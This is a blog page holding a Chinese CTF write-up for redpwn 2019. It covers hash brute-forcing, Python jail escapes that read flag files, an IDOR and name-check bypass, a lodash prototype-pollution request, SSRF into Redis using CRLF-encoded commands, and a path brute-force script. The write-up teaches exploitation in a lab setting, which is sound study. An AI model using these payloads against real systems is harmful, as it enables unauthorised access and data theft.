@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="redpwn writeup">
+<meta name="keywords" content="ctf,web,Misc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redpwn writeup">
+<meta property="og:url" content="https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/index.html">
+<meta property="og:site_name" content="Six&#39;s Blog">
+<meta property="og:description" content="redpwn writeup">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.loli.net/2019/08/22/LACYosIJWzQk8Ed.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/22/maOjpj.png">
+<meta property="og:updated_time" content="2019-12-05T14:07:46.681Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="redpwn writeup">
+<meta name="twitter:description" content="redpwn writeup">
+<meta name="twitter:image" content="https://i.loli.net/2019/08/22/LACYosIJWzQk8Ed.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>redpwn writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/09/12/自回归移动平均模型/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/09/12/word2vec学习笔记/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&text=redpwn writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&title=redpwn writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&is_video=false&description=redpwn writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=redpwn writeup&body=Check out this article: https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&title=redpwn writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&title=redpwn writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&title=redpwn writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&title=redpwn writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&name=redpwn writeup&description=&lt;p&gt;redpwn writeup&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/09/12/redpwn-writeup/&t=redpwn writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cryptography"><span class="toc-number">1.</span> <span class="toc-text">Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#superhash"><span class="toc-number">1.1.</span> <span class="toc-text">superhash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dunce-Crypto"><span class="toc-number">1.2.</span> <span class="toc-text">Dunce Crypto</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#he-sed-she-sed"><span class="toc-number">2.1.</span> <span class="toc-text">he sed she sed</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#genericpyjail"><span class="toc-number">2.2.</span> <span class="toc-text">genericpyjail</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#genericpyjail2"><span class="toc-number">2.3.</span> <span class="toc-text">genericpyjail2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Tux-Trivia-Show"><span class="toc-number">2.4.</span> <span class="toc-text">Tux Trivia Show</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">3.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ghast"><span class="toc-number">3.1.</span> <span class="toc-text">ghast</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bluePrint"><span class="toc-number">3.2.</span> <span class="toc-text">bluePrint</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#red-pwn-is"><span class="toc-number">3.3.</span> <span class="toc-text">red-pwn-is</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie-Recipes"><span class="toc-number">3.4.</span> <span class="toc-text">Cookie Recipes</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        redpwn writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Six's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-09-11T16:00:00.000Z" itemprop="datePublished">2019-09-12</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/安全技术/">安全技术</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Misc/">Misc</a>, <a class="tag-link" href="/tags/ctf/">ctf</a>, <a class="tag-link" href="/tags/web/">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>redpwn writeup</p>
+<a id="more"></a>
+<h3 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h3><h4 id="superhash"><a href="#superhash" class="headerlink" title="superhash"></a>superhash</h4><p>10次hash，密码很短。</p>
+<p>遍历可打印字符，最终长度为1。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">hash = <span class="string">"CD04302CBBD2E0EB259F53FAC7C57EE2"</span></span><br><span class="line">alphabet = string.printable</span><br><span class="line"><span class="keyword">for</span> length <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    print(<span class="string">"len:&#123;&#125;"</span>.format(length))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(alphabet,repeat = length):</span><br><span class="line">        s =<span class="string">''</span>.join(i)</span><br><span class="line">        <span class="keyword">for</span> cnt <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            h = hashlib.new(<span class="string">"md5"</span>)</span><br><span class="line">            h.update(s.encode())</span><br><span class="line">            s = h.hexdigest().upper()</span><br><span class="line">        <span class="keyword">if</span> s == hash:</span><br><span class="line">            print(<span class="string">"found string:&#123;&#125;"</span>.format(<span class="string">''</span>.join(i)))</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="Dunce-Crypto"><a href="#Dunce-Crypto" class="headerlink" title="Dunce Crypto"></a>Dunce Crypto</h4><p>凯撒密码，位移为7</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;I_d0nt_w4nt_t0_p4y_my_tax3s&#125;</span><br></pre></td></tr></table></figure>
+<p>某些网站解密，将<code>I</code> 变成了<code>i</code>。</p>
+<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="he-sed-she-sed"><a href="#he-sed-she-sed" class="headerlink" title="he sed she sed"></a>he sed she sed</h4><p>命令注入，<code>sed</code>替换字符</p>
+<h4 id="genericpyjail"><a href="#genericpyjail" class="headerlink" title="genericpyjail"></a>genericpyjail</h4><p>黑名单绕过，使用十六进制编码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(open(&apos;flag.txt&apos;).read()) =&gt; 7072696e74286f70656e2827666c61672e74787427292e72656164282929</span><br><span class="line">输入：</span><br><span class="line">&quot;7072696e74286f70656e2827666c61672e74787427292e72656164282929&quot;.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure>
+<p>或者<strong>dictionary elements can be accessed by .get()</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit(getattr(locals().get(chr(95)*2+&apos;built&apos;+&apos;ins&apos;+chr(95)*2), &apos;op&apos;+&apos;en&apos;)(&apos;fl&apos;+&apos;ag.txt&apos;).read())</span><br></pre></td></tr></table></figure>
+<h4 id="genericpyjail2"><a href="#genericpyjail2" class="headerlink" title="genericpyjail2"></a>genericpyjail2</h4><p>python字符串格式化漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raw_input((42).__class__.__base__.__subclasses__()[40](&apos;flag.txt&apos;).read())</span><br></pre></td></tr></table></figure>
+<h4 id="Tux-Trivia-Show"><a href="#Tux-Trivia-Show" class="headerlink" title="Tux Trivia Show"></a>Tux Trivia Show</h4><p>收集国家首都及美国州州府，然后编写自动提交答案的脚本即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> netcat <span class="keyword">import</span> Netcat</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_csv(<span class="string">r"./guojia.csv"</span>)</span><br><span class="line"><span class="comment"># start a new Netcat() instance</span></span><br><span class="line">nc = Netcat(<span class="string">'chall.2019.redpwn.net'</span>,<span class="number">6001</span>)</span><br><span class="line">s  = nc.read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">print(s)</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="string">"out"</span> <span class="keyword">not</span> <span class="keyword">in</span> s):</span><br><span class="line">    s  = nc.read().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(s)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"of"</span> <span class="keyword">in</span> s:</span><br><span class="line">        s = s.split()</span><br><span class="line">        q = <span class="string">" "</span>.join(s[s.index(<span class="string">"of"</span>)+<span class="number">1</span>:])[:<span class="number">-1</span>]</span><br><span class="line">        print(q)</span><br><span class="line">        cap = df[df[<span class="string">"Country"</span>] == q][<span class="string">"City"</span>].values</span><br><span class="line">        print(cap)</span><br><span class="line">        <span class="keyword">if</span> len(cap)&gt;<span class="number">0</span>:</span><br><span class="line">            nc.write(cap[<span class="number">-1</span>].encode(<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"没有信息！"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> s:</span><br><span class="line">        print(s)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Correct"</span> <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"INCORRECT"</span> <span class="keyword">in</span> s :</span><br><span class="line">        print(<span class="string">'错误'</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Here is your flag: flag&#123;TUX_tr1v1A_sh0w+m3st3r3d_:D&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="ghast"><a href="#ghast" class="headerlink" title="ghast"></a>ghast</h4><p>审计源码，发现账户被保存在一个ID为<code>ghast:0</code>的map中，并且数字是递增的。将其进行<code>base64</code>转换，并将等号去掉。此时因为管理员账户会首先被创建，所以管理员的ID为<code>ghast:0</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">let idIdx = 0</span><br><span class="line"></span><br><span class="line">const makeId = () =&gt; Buffer.from(`ghast:$&#123;idIdx++&#125;`).toString(&apos;base64&apos;).replace(/=/g, &apos;&apos;)</span><br><span class="line"></span><br><span class="line">const things = new Map()</span><br><span class="line"></span><br><span class="line">things.set(makeId(), &#123;</span><br><span class="line">  name: secrets.adminName,</span><br><span class="line">  // to prevent abuse, the admin account is locked</span><br><span class="line">  locked: true,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>在展示用户信息时，仅仅是做了ID的验证，所以我们可以通过访问<code>/ api / things / Z2hhc3Q6MA</code>查看管理员账户的信息。</p>
+<p>得到管理员账户的用户名。</p>
+<p>而访问<code>/api/flag</code>的验证有两个，首先查看用户的<code>locked</code>属性，之后验证用户名是否是管理员。</p>
+<p>所以我们需要创建一个具有管理员用户名且<code>locked</code>属性为<code>false</code>的用户。</p>
+<p>但是在注册页面是不允许创建与管理员名称相同的用户的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (body.name === secrets.adminName) &#123;</span><br><span class="line">  res.writeHead(403)</span><br><span class="line">  res.end(&apos;no&apos;)</span><br><span class="line">  return</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>但是我们发现在<code>/api/ghasts</code>中存在问题，这里也生成了ID 并且用户名没有进行验证，我们可以在这里创建一个与管理员用户名相同的用户，记录下来ID。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">if (req.url === &apos;/api/ghasts&apos; &amp;&amp; req.method === &apos;POST&apos;) &#123;</span><br><span class="line">  let body</span><br><span class="line">  try &#123;</span><br><span class="line">    body = JSON.parse(await rawBody(req, &#123;</span><br><span class="line">      limit: &apos;512kb&apos;,</span><br><span class="line">    &#125;))</span><br><span class="line">    if (typeof body.name !== &apos;string&apos; &amp;&amp; typeof body.content !== &apos;string&apos;) &#123;</span><br><span class="line">      throw 1</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; catch (e) &#123;</span><br><span class="line">    res.writeHead(400)</span><br><span class="line">    res.end(&apos;bad body&apos;)</span><br><span class="line">    return</span><br><span class="line">  &#125;</span><br><span class="line">  const id = makeId()</span><br><span class="line">  things.set(id, &#123;</span><br><span class="line">    name: body.name,</span><br><span class="line">    content: body.content,</span><br><span class="line">  &#125;)</span><br><span class="line">  res.writeHead(200)</span><br><span class="line">  res.end(id)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>将ID放入cookie，就可以访问<code>api/flag</code>。</p>
+<p>得到<code>flag{th3_AdM1n_ne3dS_A_n3W_nAme}</code>。</p>
+<h4 id="bluePrint"><a href="#bluePrint" class="headerlink" title="bluePrint"></a>bluePrint</h4><p>loadsh 版本过时，导致原型污染漏洞。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">user_id = &quot;abc768760f69a9008a981a35145595c8&quot;</span><br><span class="line">url = &quot;http://172.18.217.34/make&quot;</span><br><span class="line"> </span><br><span class="line">r = requests.post(url, cookies=&#123;&quot;user_id&quot;: user_id&#125;, json=&#123;&quot;content&quot;:&quot;here&quot;,</span><br><span class="line">&quot;public&quot;:True, &quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;public&quot;: True&#125;&#125;&#125;)</span><br></pre></td></tr></table></figure></p>
+<p>执行后，刷新页面，得到<code>flag</code>。<br><img src="https://i.loli.net/2019/08/22/LACYosIJWzQk8Ed.png" alt="blue.png"></p>
+<h4 id="red-pwn-is"><a href="#red-pwn-is" class="headerlink" title="red-pwn-is"></a>red-pwn-is</h4><p>题目给出了一个输入，可以扫描输入的url，猜测存在SSRF，经过测试仅仅允许<code>http</code>协议，在使用其他协议时返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">only the http protocol is supported</span><br></pre></td></tr></table></figure></p>
+<p>开始没有什么思路，根据提示，<code>hint: red-pwn-is could be better thought of as red-is-pwn</code>，想到可能是<code>redis</code>的问题。</p>
+<p>感觉进行尝试，果然发现问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：http://127.0.0.1:6379  # 6379是redis的端口</span><br><span class="line">返回：</span><br><span class="line">debug response:</span><br><span class="line">-ERR wrong number of arguments for &apos;get&apos; command</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>在redid的默认配置中，会开放一个没有验证的TCP/6379端口，并且会尝试去解析处理每一次输入(直到超时或者输入’QUIT’命令退出)，对于那些不存在的命令，则会显示像”-ERR unknown command”这样的输出。</p>
+</blockquote>
+<p>通过这篇<a href="https://www.cnblogs.com/sevck/p/5805884.html" target="_blank" rel="noopener">文章</a>的介绍，了解了一些语法。</p>
+<ul>
+<li>everything is separated with new lines (here CRLF)</li>
+<li>a command starts with ‘<em>‘ and the number of arguments (“</em>1” + CRLF)</li>
+<li>then we have the arguments, one by one:<ul>
+<li>string: the ‘$’ character + the string size (“$4” + CRLF) + the string value (“TIME” + CRLF)</li>
+<li>integer: the ‘:’ character + the integer in ASCII (“:42” + CRLF)</li>
+</ul>
+</li>
+</ul>
+<p>来看一下服务器信息：<code>http://127.0.0.1:6379/%0d%0a*1%0d%0a$4%0d%0aINFO%0d%0a</code></p>
+<p>真实的payload为：<code>*1 $4 INFO</code>（<code>*1\r\n$4\r\nINFO\r\n</code>）。</p>
+<blockquote>
+<p>注意：每一个命令的结尾都应该是<code>\r\n</code>，进行URL编码后是<code>%0d%0a</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$-1</span><br><span class="line">$3300</span><br><span class="line"># Server</span><br><span class="line">redis_version:5.0.5</span><br><span class="line">redis_git_sha1:00000000</span><br><span class="line">redis_git_dirty:0</span><br><span class="line">redis_build_id:4d072dc1c62d5672</span><br><span class="line">redis_mode:standalone</span><br><span class="line">os:Linux 4.15.0-58-generic x86_64</span><br><span class="line">arch_bits:64</span><br><span class="line">multiplexing_api:epoll</span><br><span class="line">atomicvar_api:atomic-builtin</span><br><span class="line">gcc_version:8.3.0</span><br><span class="line">process_id:7</span><br><span class="line">run_id:c5011502c4e860969bc4ad0626022b3869082243</span><br><span class="line">tcp_port:6379</span><br><span class="line">uptime_in_seconds:1501</span><br><span class="line">uptime_in_days:0</span><br><span class="line">hz:10</span><br><span class="line">configured_hz:10</span><br><span class="line">lru_clock:6157889</span><br><span class="line">executable:/usr/src/app/redis-server</span><br><span class="line">config_file:/usr/local/etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line"># Clients</span><br><span class="line">connected_clients:1</span><br><span class="line">client_recent_max_input_buffer:83</span><br><span class="line">client_recent_max_output_buffer:0</span><br><span class="line">blocked_clients:0</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>读取<code>keys</code>值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n</span><br></pre></td></tr></table></figure></p>
+<p>编码为：<code>http://127.0.0.1:6379/%0d%0a*2%0d%0a$4%0d%0aKEYS%0d%0a$1%0d%0a*0d%0a</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">debug response:</span><br><span class="line">$-1</span><br><span class="line">*1</span><br><span class="line">$4</span><br><span class="line">flag</span><br><span class="line">-ERR unknown command `HTTP/1.1`, with args beginning with:</span><br></pre></td></tr></table></figure></p>
+<p>发现<code>flag</code>的<code>key</code>，尝试读取。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：*2\r\n$3\r\nGET\r\n$4\r\nflag\r\n</span><br></pre></td></tr></table></figure></p>
+<p>编码为：<code>http://127.0.0.1:6379/%0d%0a*2%0d%0a$3%0d%0aGET%0d%0a$4%0d%0aflag0d%0a</code></p>
+<p>得到<code>flag</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">debug response:</span><br><span class="line">$-1</span><br><span class="line">$28</span><br><span class="line">flag&#123;r3d_pWn_is_buT_n0T_pwN&#125;</span><br><span class="line">-ERR unknown command `HTTP/1.1`, with args beginning with:</span><br></pre></td></tr></table></figure></p>
+<h4 id="Cookie-Recipes"><a href="#Cookie-Recipes" class="headerlink" title="Cookie Recipes"></a>Cookie Recipes</h4><p>这个题目的脑洞有点大！</p>
+<p>首先发现一个输入框，页面源码也非常的简单。</p>
+<p>尝试进行注入，无果，没有发现有价值的东西。</p>
+<p>使用<code>dirb</code>爆破路径，发现<code>robots.txt</code>。</p>
+<p>访问，发现了提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /u0tiI6DJlA1Zj9n2irnB/*.txt</span><br></pre></td></tr></table></figure></p>
+<p>看着好像是一个路径，或许我们的<code>flag</code>就在这个路径里面，但是怎么获得这个路径呢？</p>
+<p>看一下官方的提示：<br><img src="https://s2.ax1x.com/2019/08/22/maOjpj.png" alt="maOjpj.png"></p>
+<p>看形式，像是字典中的一个词条。难道是利用字典来猜测？</p>
+<p>从GitHub上下载一个英语词典文档,<br><code>https://github.com/dwyl/english-words</code>。</p>
+<p>写脚本尝试进行遍历：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">with open(&quot;./words_alpha.txt&quot;) as fp:</span><br><span class="line">    words = fp.readlines()</span><br><span class="line">words = [word.strip() for word in words]</span><br><span class="line">for word in words:</span><br><span class="line">    print(word)</span><br><span class="line">    url = &quot;http://127.0.0.1:3000/u0tiI6DJlA1Zj9n2irnB/%s.txt&quot; % word</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    if &quot;Cannot&quot; not in r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br><span class="line">    r.close()</span><br><span class="line">    time.sleep(0.01)</span><br></pre></td></tr></table></figure></p>
